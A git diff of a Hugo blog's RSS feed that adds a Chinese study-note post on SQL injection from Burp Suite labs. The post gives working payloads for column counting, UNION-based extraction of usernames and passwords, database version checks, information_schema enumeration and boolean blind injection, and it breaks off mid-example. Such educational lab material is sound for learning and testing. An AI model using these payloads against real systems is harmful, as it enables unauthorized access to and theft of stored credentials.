@@ -7,7 +7,632 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Calendar</copyright>
-        <lastBuildDate>Thu, 20 Nov 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://calendar0917.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Fri, 21 Nov 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://calendar0917.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Burp靶场：SQL注入</title>
+        <link>https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/</link>
+        <pubDate>Fri, 21 Nov 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-sql%E6%B3%A8%E5%85%A5/</guid>
+        <description>&lt;h2 id=&#34;知识&#34;&gt;知识
+&lt;/h2&gt;&lt;h3 id=&#34;注入点&#34;&gt;注入点
+&lt;/h3&gt;&lt;p&gt;可以通过对应用程序的&lt;strong&gt;所有输入点&lt;/strong&gt;执行一套系统化测试，手动检测 SQL 注入漏洞。通常需提交以下内容：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;单引号字符 &lt;code&gt;&#39;&lt;/code&gt;，观察是否出现错误或其他异常；&lt;/li&gt;
+&lt;li&gt;特定 SQL 语法（其计算结果分别等于输入点的原始值和不同值），观察应用程序响应是否存在规律性差异；&lt;/li&gt;
+&lt;li&gt;布尔条件（如 &lt;code&gt;OR 1=1&lt;/code&gt;、&lt;code&gt;OR 1=2&lt;/code&gt;），观察应用程序响应差异；&lt;/li&gt;
+&lt;li&gt;用于在 SQL 查询执行时触发延时的负载，观察响应时间是否存在差异；&lt;/li&gt;
+&lt;li&gt;用于在 SQL 查询执行时触发带外网络交互的 OAST（带外应用安全测试） 负载，并监控是否产生相关交互。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;此外，也可以使用 Burp Scanner 快速、可靠地发现绝大多数 SQL 注入漏洞。&lt;/p&gt;
+&lt;h3 id=&#34;union-攻击&#34;&gt;UNION 攻击
+&lt;/h3&gt;&lt;p&gt;当应用程序存在SQL注入漏洞，且查询结果会返回到应用响应中时，可利用 &lt;code&gt;UNION&lt;/code&gt; 关键字从数据库的&lt;strong&gt;其他表&lt;/strong&gt;中获取数据。这种攻击方式通常被称为 &lt;strong&gt;SQL注入UNION攻击&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;UNION&lt;/code&gt; 关键字允许执行一个或多个额外的 &lt;code&gt;SELECT&lt;/code&gt; 查询，并将结果附加到原始查询中。例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;UNION&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该SQL查询会返回一个包含两列的结果集，数据涵盖 &lt;code&gt;table1&lt;/code&gt; 表的 &lt;code&gt;a&lt;/code&gt;、&lt;code&gt;b&lt;/code&gt; 列和 &lt;code&gt;table2&lt;/code&gt; 表的 &lt;code&gt;c&lt;/code&gt;、&lt;code&gt;d&lt;/code&gt; 列。&lt;/p&gt;
+&lt;p&gt;要让 UNION 查询生效，必须满足两个关键条件：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;各个查询必须返回&lt;strong&gt;相同数量的列&lt;/strong&gt;；&lt;/li&gt;
+&lt;li&gt;各个查询对应列的数据类型必须&lt;strong&gt;兼容&lt;/strong&gt;。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;实施 SQL 注入 UNION 攻击时，需确保攻击手段符合这两个条件。这通常需要查明以下两点：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;原始查询返回的列数是多少；&lt;/li&gt;
+&lt;li&gt;原始查询返回的列中，哪些列的数据类型适合承载注入查询的结果。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;判断列数&#34;&gt;判断列数
+&lt;/h4&gt;&lt;p&gt;在实施SQL注入UNION攻击时，有两种有效方法可确定原始查询返回的列数。&lt;/p&gt;
+&lt;p&gt;其中一种方法是注入一系列&lt;code&gt;ORDER BY&lt;/code&gt;子句，并逐步增加指定的列索引，直至触发错误。例如，若注入点位于原始查询&lt;code&gt;WHERE&lt;/code&gt;子句内的带引号字符串中，你需要提交以下负载：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; ORDER BY 1--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; ORDER BY 2--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; ORDER BY 3--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;……
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这一系列负载会修改原始查询，使其按结果集中的不同列对结果排序。&lt;code&gt;ORDER BY&lt;/code&gt;子句中的列可通过索引指定，因此无需知晓任何列名。当指定的列索引超过结果集中的实际列数时，数据库会返回错误，例如：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ORDER BY位置编号3超出了选择列表中的项目数量。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;应用程序可能会在HTTP响应中直接返回数据库错误，也可能返回通用的错误响应，甚至可能仅返回空结果。无论哪种情况，只要能检测到&lt;strong&gt;响应中的差异&lt;/strong&gt;，就能推断出查询返回的列数。&lt;/p&gt;
+&lt;p&gt;第二种方法是提交一系列&lt;code&gt;UNION SELECT&lt;/code&gt;负载，其中包含数量不同的空值（&lt;code&gt;NULL&lt;/code&gt;）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,NULL--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,NULL--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;……
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;若空值的数量与列数不匹配，数据库会返回错误。&lt;/p&gt;
+&lt;p&gt;我们将注入的&lt;code&gt;SELECT&lt;/code&gt;查询的返回值设为&lt;code&gt;NULL&lt;/code&gt;，原因是原始查询与注入查询的对应列必须数据类型兼容。而&lt;code&gt;NULL&lt;/code&gt;可&lt;strong&gt;转换为所有常见的数据类型&lt;/strong&gt;，因此当列数正确时，能最大程度提高负载的执行成功率。&lt;/p&gt;
+&lt;h4 id=&#34;寻找数据类型可用的列&#34;&gt;寻找数据类型可用的列
+&lt;/h4&gt;&lt;p&gt;SQL注入UNION攻击能让你获取注入查询的结果，而你想要提取的关键数据通常是以字符串形式存储的。这意味着，你需要在原始查询的结果中，找到一列或多列&lt;strong&gt;数据类型为字符串，或与字符串数据兼容&lt;/strong&gt;的列。&lt;/p&gt;
+&lt;p&gt;在确定所需的列数后，你可以逐个探测每一列，测试其是否能存储字符串数据。你需要提交一系列&lt;code&gt;UNION SELECT&lt;/code&gt;负载，依次在每一列中放入一个字符串值。例如，若查询返回四列，你应提交以下负载：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT &amp;#39;a&amp;#39;,NULL,NULL,NULL--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,&amp;#39;a&amp;#39;,NULL,NULL--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,&amp;#39;a&amp;#39;,NULL--
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,NULL,&amp;#39;a&amp;#39;--
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果目标列的数据类型与字符串不兼容，注入的查询会触发数据库错误。&lt;/p&gt;
+&lt;p&gt;若未出现错误，且应用程序的响应中包含了额外内容（其中包含注入的字符串值），则说明该列适合用于提取字符串数据。&lt;/p&gt;
+&lt;h4 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h4&gt;&lt;p&gt;当你确定了原始查询返回的列数，并找到可存储字符串数据的列后，就可以着手获取关键数据了。&lt;/p&gt;
+&lt;p&gt;假设存在以下条件：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;原始查询返回两列，且这两列均支持存储字符串数据；&lt;/li&gt;
+&lt;li&gt;注入点位于&lt;code&gt;WHERE&lt;/code&gt;子句内的带引号字符串中；&lt;/li&gt;
+&lt;li&gt;数据库中存在一个名为&lt;code&gt;users&lt;/code&gt;的表，包含&lt;code&gt;username&lt;/code&gt;（用户名）和&lt;code&gt;password&lt;/code&gt;（密码）两列。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;在这个示例中，你可以提交如下输入，获取&lt;code&gt;users&lt;/code&gt;表中的数据：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT username, password FROM users--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;要实施此类攻击，你&lt;strong&gt;需要预先知晓&lt;/strong&gt;数据库中存在&lt;code&gt;users&lt;/code&gt;表，且该表包含&lt;code&gt;username&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;列。若缺乏这些信息，就需要猜测表名和列名。不过，所有现代数据库都提供了查看数据库结构的方法，可通过这些方法确定其中包含的表和列。&lt;/p&gt;
+&lt;h5 id=&#34;合并字符串&#34;&gt;合并字符串
+&lt;/h5&gt;&lt;p&gt;有时候，不会所有列都返回或显示，这时候就需要将字符串合并起来，具体需要看是什么数据库。&lt;/p&gt;
+&lt;p&gt;例如在 Oracle 数据库中，可提交如下输入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT username || &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; || password FROM users--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里使用的双竖线&lt;code&gt;||&lt;/code&gt;是 Oracle 的字符串拼接运算符。注入的查询会将&lt;code&gt;username&lt;/code&gt;和&lt;code&gt;password&lt;/code&gt;字段的值拼接在一起，并以&lt;code&gt;~&lt;/code&gt;字符作为分隔。&lt;/p&gt;
+&lt;h3 id=&#34;不同数据库的差异&#34;&gt;不同数据库的差异
+&lt;/h3&gt;&lt;p&gt;详见：&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SQL injection cheat sheet | Web Security Academy&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;对注释、查询等，不同的数据库会有不同的特定行为，需要根据需要更改。主要类型有：Oracle、Microsoft、PostgreSQL、MySQL&lt;/p&gt;
+&lt;h3 id=&#34;数据库信息查询&#34;&gt;数据库信息查询
+&lt;/h3&gt;&lt;p&gt;通过注入不同数据库厂商专属的查询语句，根据语句是否执行成功，来确定数据库的&lt;strong&gt;类型&lt;/strong&gt;和&lt;strong&gt;版本&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;以下是用于查询几款主流数据库版本的语句：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;数据库类型&lt;/th&gt;
+          &lt;th&gt;查询语句&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;微软 SQL Server、MySQL&lt;/td&gt;
+          &lt;td&gt;SELECT @@version&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Oracle&lt;/td&gt;
+          &lt;td&gt;SELECT * FROM v$version&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;PostgreSQL&lt;/td&gt;
+          &lt;td&gt;SELECT version()&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;列出数据库中的内容&#34;&gt;列出数据库中的内容
+&lt;/h4&gt;&lt;p&gt;多数数据库类型（Oracle 除外）都包含一组名为 &lt;strong&gt;信息模式（information schema&lt;/strong&gt; 的视图，这组视图会提供数据库的相关元数据信息。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Oracle 不使用&lt;code&gt;information_schema&lt;/code&gt;，而是通过内置系统表（如&lt;code&gt;all_tables&lt;/code&gt;查看表名、&lt;code&gt;all_tab_columns&lt;/code&gt;查看列信息）来获取元数据。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;例如，你可以查询&lt;code&gt;information_schema.tables&lt;/code&gt;来列出数据库中的所有表：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该查询会返回类似如下的结果：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;TABLE_CATALOG&lt;/th&gt;
+          &lt;th&gt;TABLE_SCHEMA&lt;/th&gt;
+          &lt;th&gt;TABLE_NAME&lt;/th&gt;
+          &lt;th&gt;TABLE_TYPE&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MyDatabase&lt;/td&gt;
+          &lt;td&gt;dbo&lt;/td&gt;
+          &lt;td&gt;Products&lt;/td&gt;
+          &lt;td&gt;BASE TABLE&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MyDatabase&lt;/td&gt;
+          &lt;td&gt;dbo&lt;/td&gt;
+          &lt;td&gt;Users&lt;/td&gt;
+          &lt;td&gt;BASE TABLE&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MyDatabase&lt;/td&gt;
+          &lt;td&gt;dbo&lt;/td&gt;
+          &lt;td&gt;Feedback&lt;/td&gt;
+          &lt;td&gt;BASE TABLE&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;上述结果表明数据库中有三张表，分别为&lt;code&gt;Products&lt;/code&gt;、&lt;code&gt;Users&lt;/code&gt;和&lt;code&gt;Feedback&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;随后，你可以查询&lt;code&gt;information_schema.columns&lt;/code&gt;来列出单个表中的列信息：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Users&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该查询会返回类似如下的结果：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;TABLE_CATALOG&lt;/th&gt;
+          &lt;th&gt;TABLE_SCHEMA&lt;/th&gt;
+          &lt;th&gt;TABLE_NAME&lt;/th&gt;
+          &lt;th&gt;COLUMN_NAME&lt;/th&gt;
+          &lt;th&gt;DATA_TYPE&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MyDatabase&lt;/td&gt;
+          &lt;td&gt;dbo&lt;/td&gt;
+          &lt;td&gt;Users&lt;/td&gt;
+          &lt;td&gt;UserId&lt;/td&gt;
+          &lt;td&gt;int&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MyDatabase&lt;/td&gt;
+          &lt;td&gt;dbo&lt;/td&gt;
+          &lt;td&gt;Users&lt;/td&gt;
+          &lt;td&gt;Username&lt;/td&gt;
+          &lt;td&gt;varchar&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;MyDatabase&lt;/td&gt;
+          &lt;td&gt;dbo&lt;/td&gt;
+          &lt;td&gt;Users&lt;/td&gt;
+          &lt;td&gt;Password&lt;/td&gt;
+          &lt;td&gt;varchar&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;盲注&#34;&gt;盲注
+&lt;/h3&gt;&lt;p&gt;当应用程序存在 SQL 注入漏洞，但 HTTP 响应中&lt;strong&gt;不包含相关 SQL 查询的结果&lt;/strong&gt;，也&lt;strong&gt;不显示任何数据库错误详情&lt;/strong&gt;时，就会发生盲注。&lt;/p&gt;
+&lt;p&gt;许多注入技术（如 UNION 攻击）在盲注漏洞中无法奏效，这是因为这些技术的核心依赖是能在应用响应中看到注入查询的执行结果。不过，攻击者仍可利用盲注获取未授权数据，只是需要使用不同的技术手段。&lt;/p&gt;
+&lt;h4 id=&#34;布尔&#34;&gt;布尔
+&lt;/h4&gt;&lt;p&gt;什么技术手段呢？一个例子是，根据返回的内容进行判断，例如分别注入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;…&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xyz&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
